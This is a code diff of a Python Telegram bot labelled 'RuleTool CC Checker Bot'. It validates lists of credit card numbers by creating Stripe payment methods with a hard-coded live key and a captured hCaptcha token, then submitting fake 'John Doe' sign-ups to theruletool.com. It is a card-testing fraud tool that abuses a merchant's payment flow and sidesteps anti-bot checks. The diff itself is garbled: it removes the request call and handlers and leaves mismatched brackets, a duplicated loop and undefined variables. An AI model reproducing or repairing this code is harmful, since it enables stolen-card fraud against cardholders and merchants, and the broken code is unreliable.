@@ -30,6 +30,7 @@ def parse_cards(text):
     return cards
 
 def get_stripe_pm(email, cc, mm, yy, cvv):
+    from uuid import uuid4
     guid = str(uuid4())
     muid = str(uuid4())
     sid = str(uuid4())
@@ -50,54 +51,38 @@ def get_stripe_pm(email, cc, mm, yy, cvv):
         "referrer": "https://app.theruletool.com",
         "time_on_page": str(random.randint(10000, 99999)),
         "key": "pk_live_IEQsNdUrbZuQsRHI0yPFlzwM00D623ymrA",
-        # You must supply a valid hcaptcha token for real requests
         "radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiVmdQZFJwRjhFUjhuU2t6V2h6bjdtZklPNzliOGZJVFBpcnFoUTJXQWJtRG4rSEFHNVQwcTVoZFU2WlRlVDZ6NGNGMEUrdWpWbWVRbnVkWVBueEM1R0pGNEZLdU44Y2crcHBpZ3Uza00zNFpxMUdFWnV2eEpnY2pJeVFUTlBrR3VBVVI0anArb3R5RTdsMDJtVjZ0SFpkbXJvSEs1QVBDY3BOSVMwdFZSMUk2cFRtS3RDTUtKZEJNSlp3VVdHc1pseVlwcEsxYkVyampjUFVSTk9sK1RuUUZsbTROY0ZtNkRGT0trT0VaQVZCNERjbG45RDE4RGU1b1M5MlYxMXZyUWx6bTYvdXRaRDhGRTV4VGQyY01CbXR3WjlUclBwNjBsaXREcC8xbmxRSlNqaG93ekZSM1lzNkpZVFozRTlHTENZL3lseXNXclFaZE10M2FyNnd0RkhmNXZvUWI5UjZkb3FmYUNUT0c1b1M0MjluYzlDZmF4MVpuRTMzenJOdlZNQmFxUERxQ2VGb3Vmc2FBTlhiNnAwbXIwa0Zib3pCZ1NuM0dyaWdvVC9zbDIzSDQvekt2SWtpL0s0cTVhdG5XZXNjcVprMmJwU0hLS0IwTUUvT21Oc1ZEVWdGNUpvNEhLb0wzdlZhaSs3WWVZMTVnOFNFUElVNERKVlppTmMzQ2tKWFlDSWI3NjJmdzUyaHdWWjRWalBtdElZZXM3R0loWUJxRjJJazRLZXl2ME8wZ1JOME5MOXUvU2orWFg4SzcrVjVYMXBzdkJWb1BKS1RYWjI0SHlpYkVUQUtoNEduZml2UEVWcnZtdC83N2ZmakhYUzhCck4wc2dzWkhqUDVKZzN0ZkxWZ2N0SjR5WmxkdHVRNHV3VnB4WGZocjQ3K3hOWjBjU0hVbVZYNDBMelBwOUpMa1NCUDl3WjhlTHZlQ2VYMHMzTVd5YjZ0eUgwU3o0c01xZEJQeGJjTjVCaVRyQ0JSNmcvaG8zSVluSjVIWGF6dmJVL2NxOVFndHVlLzNOVEgxR3BWc0xWaXdVaDBPQUVIS3Q1UXBDTFZEZlQvenNNb2Z1WnFuSlcvakxXVUxaNkxOTjQxQkg4eXBFSHZ0SlVhSlpMb2J1N3dVcE5KNWVRV0J2cVpnaUJnRE5NclFCUm8xUGhtdFE5aFZXYmpMRTBHRmM1ZXFsd3JGYzMwR1Z3amlwcTBYb2lvOWRXNCtNT2xpakZkdlRGNytSRFRqSmJseWlLSmpBVVp2NjVRT2txMkFNMzVRcjFIMElvdW5mVmJuZFZLaVlLMHpGK09tSWUwdEVHN0k4T2pzZFR3a0hJSmh6SlVrZ081Q0Z1YmJ5dWRnNVc0ZDR3OEk3TlhUdk1MYzNpOE9WVnFOc09oWVVSMnprRWxIK0NLNFduWEtFTzBGcmlCSjhKdTBHME9ES0NlS1EvU1hxa2hPdXhxazRtd2NxL25QVm41bnI0Rnk2QmRkTlQzYS81K3BIZWZPSlkwbE9hL0RyV1FxcnRRYVg4NXFqampZeUpETVhxeFJPcm9YSngvNm9iRHYyTW01eVdGamFtZEx3TWJ2NG1NVVFlYnRhUi9vYzQ2bUczS2tMYVNjb2o0MVpuRWdvSnBIRFBvMXZrSUVRRngxTG12b3BiRUtmYnAxWmdrYWFUcWxkek84cjRORGc3SWsyRkJ5K3VINERBb1FvMWNsakdVYm81b2ZIbFM4Q2tIQXZmQ3J2VXpHVGtOb1UxTW1jaE41Mnlva1kra0JJUjNrdUpOUWVlZEhVbHRQTUlNcHY5STJzMmIxUndsSExCRHZNWnQyd1F5b3VyNDZRMUt0bTZmNlZqdEZOVjM5dWJWZjBReVYwMWtESzZtbTB5Y0MzTThTeWlrUXljODdheUlRQysya3RyMDA0d2JqM3g0Qnk2UVA2V0JzeDNyT09ZQUxubTVLYzVkaFZmemtsOGlCT3IzK2xpSStyUCtBQW9IWGYzUXlIOXEyK3BTRExnNEw1YkpRYUhENmtEN0FxeVpJVjRENFZPTUNwZ2JqVW5yOTlyKzJ4bENCQzdjZW1QbGsxZ3BCRTZveXVSN2lZdVRSVFQwZnpIQUVGTGFZekptM1lVRERxNlBGREdqRmpiczEyYzJ6SWpWVWw1NE9PSjhBdmVpRytQR2hJR0FpUTdsQTdVbHd3S1dNVkpqdS9rK3M1TXkycEptUHpFZldSaHBEQXYxVTlPRzhVTFZBeEVOWkp4MEt3eGJ6d3kwVnFvdWtVSkFZSXBUVXhwZitvT1VJS2ZheEtBYWxCTGg2VkdrMnlZWmVJTE83YVIrbUljUW1WT3lRanEzb0RMM0lmU2tYRUhqOW5Kbkx6MEJwaGQ1MEVueG9CcitZQldKNUhPRHFCVUZQUGN2Y3RqWkkyZExzV0h6TU9UK3QwL0tqOVJZajJHeEhET09BQXk4V2taeVN0bVhDS1o3anJ2NC9MSVZpRHBaMU1rVHFNM1BtWVhyUllFZGJUKzdYaEIxY2tVQnVNeElJL2Q2azBOY1AyTytFaG15TTZoZzViZU9PTXJCYlE4OTBReUMxc2plNzVWcjExUDBGb1E5emVhUjVCcFQ0WjNFeVEyNjBaRG1hYjhTcWZ5bkw2NTh1NHhGb1Z5eWs4YVVzOHF2Z0dpK3M3Vzh5K0lmV3JmcjVXempXVlg4ZC9LaGNiQjdVMDdKYjh0ZXBBS2x4ZVlSSXY3cSswWTFCRm90WEo0M2Z5NytrYzNDVzFxUnFBcnBrVFlGZXNONVB3NmVna2FsRDgwVVl1U1UvaUVlUmV3VlVnY0xqMXUwVXdWWFI5ZjBhRFdDMURiWm9rRnhNMnZzN2FLUE9VZVMrY05GaDFkWGpEeFNERTZaUDY3Z2xFRFBHVUFtRTBrQT09IiwiZXhwIjoxNzQ3MDU2NzY0LCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMjRlMzgzYjkiLCJwZCI6MCwiY2RhdGEiOiJ1TjJNM2duZ0pLQi84dHhsV25zbGdEeGt1ZDVTNk5rWEZOTytrbkI2dzREV1ZySFBPN2VwK2tIYTZFZ29lbk5oS0xoZmpWSEJnWTFmRFN0cnVTclRXMkUxMDBoZHhVZ1FqZVExT3FnR1lCOStXeGZxMmJNZko2bTJHcjBvWGd6bGxuT3lka0xDTllhK0F6M2JHM0hMclpuajV3M3dqSmxKVDBLYzJIa3BjaWVBYnJuR1V4dDNVV0UzazROVU1xcHVNK0lqVUlNZ21jNERnc2E1In0.EiL7C4ck57anNNbJufiXcmAwfrq4Vsd1vy92cGiflcg"
-    }
-    headers = {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
-        "accept": "application/json"
-    }
-    resp = requests.post("https://api.stripe.com/v1/payment_methods", data=data, headers=headers, timeout=30)
-    try:
-        res_json = resp.json()
-        pm_id = res_json.get("id", "")
-        return pm_id, resp.text
-    except Exception:
-        return "", resp.text
-
-@bot.message_handler(commands=['start'])
-def start_handler(message):
-    bot.send_message(
-        message.chat.id,
-        "🔒 RuleTool CC Checker Bot\n\n"
-        "Send credit cards in one of these formats (one per line):\n"
-        "`CC|MM|YY|CVV`\n"
-        "`CC|MM|YYYY|CVV`\n"
-        "`CC/MM/YY/CVV`\n"
-        "`CC/MM/YYYY/CVV`\n\n"
-        "⏳ 15s delay between checks\n"
-        "⏹ Use /stop to cancel processing",
-        parse_mode="Markdown"
     )
-
-@bot.message_handler(commands=['stop'])
-def stop_handler(message):
-    user_stop_flag[message.from_user.id] = True
-    bot.send_message(message.chat.id, "⏹ Processing stopped")
-
-def check_card_flow(message, cards):
-    from uuid import uuid4
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-    user_stop_flag[user_id] = False
 
     for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
         if user_stop_flag.get(user_id):
             bot.send_message(chat_id, "⏹️ Checking stopped by user.")
             break
 
-        email = random_email()
+        data = {
+            "type": "card",
+            "billing_details[email]": email,
+            "billing_details[name]": "John Doe",
+            "billing_details[phone]": "(314)474-6658",
+            "card[number]": cc,
+            "card[cvc]": cvv,
+            "card[exp_month]": mm,
+            "card[exp_year]": yy[-2:],
+            "guid": str(uuid4()),
+            "muid": str(uuid4()),
+            "sid": str(uuid4()),
+            "payment_user_agent": "stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; card-element",
+            "referrer": "https://app.theruletool.com",
+            "time_on_page": str(random.randint(10000, 99999)),
+            "key": "pk_live_IEQsNdUrbZuQsRHI0yPFlzwM00D623ymrA",
+            "radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiVmdQZFJwRjhFUjhuU2t6V2h6bjdtZklPNzliOGZJVFBpcnFoUTJXQWJtRG4rSEFHNVQwcTVoZFU2WlRlVDZ6NGNGMEUrdWpWbWVRbnVkWVBueEM1R0pGNEZLdU44Y2crcHBpZ3Uza00zNFpxMUdFWnV2eEpnY2pJeVFUTlBrR3VBVVI0anArb3R5RTdsMDJtVjZ0SFpkbXJvSEs1QVBDY3BOSVMwdFZSMUk2cFRtS3RDTUtKZEJNSlp3VVdHc1pseVlwcEsxYkVyampjUFVSTk9sK1RuUUZsbTROY0ZtNkRGT0trT0VaQVZCNERjbG45RDE4RGU1b1M5MlYxMXZyUWx6bTYvdXRaRDhGRTV4VGQyY01CbXR3WjlUclBwNjBsaXREcC8xbmxRSlNqaG93ekZSM1lzNkpZVFozRTlHTENZL3lseXNXclFaZE10M2FyNnd0RkhmNXZvUWI5UjZkb3FmYUNUT0c1b1M0MjluYzlDZmF4MVpuRTMzenJOdlZNQmFxUERxQ2VGb3Vmc2FBTlhiNnAwbXIwa0Zib3pCZ1NuM0dyaWdvVC9zbDIzSDQvekt2SWtpL0s0cTVhdG5XZXNjcVprMmJwU0hLS0IwTUUvT21Oc1ZEVWdGNUpvNEhLb0wzdlZhaSs3WWVZMTVnOFNFUElVNERKVlppTmMzQ2tKWFlDSWI3NjJmdzUyaHdWWjRWalBtdElZZXM3R0loWUJxRjJJazRLZXl2ME8wZ1JOME5MOXUvU2orWFg4SzcrVjVYMXBzdkJWb1BKS1RYWjI0SHlpYkVUQUtoNEduZml2UEVWcnZtdC83N2ZmakhYUzhCck4wc2dzWkhqUDVKZzN0ZkxWZ2N0SjR5WmxkdHVRNHV3VnB4WGZocjQ3K3hOWjBjU0hVbVZYNDBMelBwOUpMa1NCUDl3WjhlTHZlQ2VYMHMzTVd5YjZ0eUgwU3o0c01xZEJQeGJjTjVCaVRyQ0JSNmcvaG8zSVluSjVIWGF6dmJVL2NxOVFndHVlLzNOVEgxR3BWc0xWaXdVaDBPQUVIS3Q1UXBDTFZEZlQvenNNb2Z1WnFuSlcvakxXVUxaNkxOTjQxQkg4eXBFSHZ0SlVhSlpMb2J1N3dVcE5KNWVRV0J2cVpnaUJnRE5NclFCUm8xUGhtdFE5aFZXYmpMRTBHRmM1ZXFsd3JGYzMwR1Z3amlwcTBYb2lvOWRXNCtNT2xpakZkdlRGNytSRFRqSmJseWlLSmpBVVp2NjVRT2txMkFNMzVRcjFIMElvdW5mVmJuZFZLaVlLMHpGK09tSWUwdEVHN0k4T2pzZFR3a0hJSmh6SlVrZ081Q0Z1YmJ5dWRnNVc0ZDR3OEk3TlhUdk1MYzNpOE9WVnFOc09oWVVSMnprRWxIK0NLNFduWEtFTzBGcmlCSjhKdTBHME9ES0NlS1EvU1hxa2hPdXhxazRtd2NxL25QVm41bnI0Rnk2QmRkTlQzYS81K3BIZWZPSlkwbE9hL0RyV1FxcnRRYVg4NXFqampZeUpETVhxeFJPcm9YSngvNm9iRHYyTW01eVdGamFtZEx3TWJ2NG1NVVFlYnRhUi9vYzQ2bUczS2tMYVNjb2o0MVpuRWdvSnBIRFBvMXZrSUVRRngxTG12b3BiRUtmYnAxWmdrYWFUcWxkek84cjRORGc3SWsyRkJ5K3VINERBb1FvMWNsakdVYm81b2ZIbFM4Q2tIQXZmQ3J2VXpHVGtOb1UxTW1jaE41Mnlva1kra0JJUjNrdUpOUWVlZEhVbHRQTUlNcHY5STJzMmIxUndsSExCRHZNWnQyd1F5b3VyNDZRMUt0bTZmNlZqdEZOVjM5dWJWZjBReVYwMWtESzZtbTB5Y0MzTThTeWlrUXljODdheUlRQysya3RyMDA0d2JqM3g0Qnk2UVA2V0JzeDNyT09ZQUxubTVLYzVkaFZmemtsOGlCT3IzK2xpSStyUCtBQW9IWGYzUXlIOXEyK3BTRExnNEw1YkpRYUhENmtEN0FxeVpJVjRENFZPTUNwZ2JqVW5yOTlyKzJ4bENCQzdjZW1QbGsxZ3BCRTZveXVSN2lZdVRSVFQwZnpIQUVGTGFZekptM1lVRERxNlBGREdqRmpiczEyYzJ6SWpWVWw1NE9PSjhBdmVpRytQR2hJR0FpUTdsQTdVbHd3S1dNVkpqdS9rK3M1TXkycEptUHpFZldSaHBEQXYxVTlPRzhVTFZBeEVOWkp4MEt3eGJ6d3kwVnFvdWtVSkFZSXBUVXhwZitvT1VJS2ZheEtBYWxCTGg2VkdrMnlZWmVJTE83YVIrbUljUW1WT3lRanEzb0RMM0lmU2tYRUhqOW5Kbkx6MEJwaGQ1MEVueG9CcitZQldKNUhPRHFCVUZQUGN2Y3RqWkkyZExzV0h6TU9UK3QwL0tqOVJZajJHeEhET09BQXk4V2taeVN0bVhDS1o3anJ2NC9MSVZpRHBaMU1rVHFNM1BtWVhyUllFZGJUKzdYaEIxY2tVQnVNeElJL2Q2azBOY1AyTytFaG15TTZoZzViZU9PTXJCYlE4OTBReUMxc2plNzVWcjExUDBGb1E5emVhUjVCcFQ0WjNFeVEyNjBaRG1hYjhTcWZ5bkw2NTh1NHhGb1Z5eWs4YVVzOHF2Z0dpK3M3Vzh5K0lmV3JmcjVXempXVlg4ZC9LaGNiQjdVMDdKYjh0ZXBBS2x4ZVlSSXY3cSswWTFCRm90WEo0M2Z5NytrYzNDVzFxUnFBcnBrVFlGZXNONVB3NmVna2FsRDgwVVl1U1UvaUVlUmV3VlVnY0xqMXUwVXdWWFI5ZjBhRFdDMURiWm9rRnhNMnZzN2FLUE9VZVMrY05GaDFkWGpEeFNERTZaUDY3Z2xFRFBHVUFtRTBrQT09IiwiZXhwIjoxNzQ3MDU2NzY0LCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMjRlMzgzYjkiLCJwZCI6MCwiY2RhdGEiOiJ1TjJNM2duZ0pLQi84dHhsV25zbGdEeGt1ZDVTNk5rWEZOTytrbkI2dzREV1ZySFBPN2VwK2tIYTZFZ29lbk5oS0xoZmpWSEJnWTFmRFN0cnVTclRXMkUxMDBoZHhVZ1FqZVExT3FnR1lCOStXeGZxMmJNZko2bTJHcjBvWGd6bGxuT3lka0xDTllhK0F6M2JHM0hMclpuajV3M3dqSmxKVDBLYzJIa3BjaWVBYnJuR1V4dDNVV0UzazROVU1xcHVNK0lqVUlNZ21jNERnc2E1In0.EiL7C4ck57anNNbJufiXcmAwfrq4Vsd1vy92cGiflcg"
+    )
+
+    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
+        if user_stop_flag.get(user_id):
+            bot.send_message(chat_id, "⏹️ Checking stopped by user.")
+            break
+
         pm_id, stripe_raw = get_stripe_pm(email, cc, mm, yy, cvv)
         if not pm_id or not pm_id.startswith("pm_"):
             bot.send_message(
@@ -111,7 +96,6 @@ def check_card_flow(message, cards):
             )
             continue
 
-        # Prepare RuleTool signup/create POST data (as text/plain)
         signup_url = "https://app.theruletool.com/signup/create"
         post_data = (
             f'{{"pm_id":"{pm_id}","email":"{email}","first_name":"John","last_name":"Doe","password":"{random_email()}","confirm_password":"{random_email()}","phone":"(314)474-6658"}}'
